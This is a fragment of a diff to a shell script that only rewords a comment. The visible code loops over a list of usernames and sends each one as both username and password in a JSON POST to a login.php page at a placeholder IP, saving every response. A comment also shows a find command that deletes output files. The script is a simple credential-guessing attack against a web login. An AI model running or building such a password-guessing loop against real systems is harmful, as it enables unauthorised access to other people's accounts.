@@ -4,7 +4,7 @@
 # 
 # Note: use find . -type f -size xxxxc -exec rm {}\; to erase non-relevant output files
 # 
-# Use usernames and in this first loop also as passwords
+# Use usernames and these in this first loop also as passwords
 for i in `cat users`
 do 
 curl -o ${i}.nfo -i -X POST http://aa.bb.cc.dd/login.php  -d "{\"user\":\"${i}\",\"password\":\"${i}\"}" -H "Content-type: application/json" 
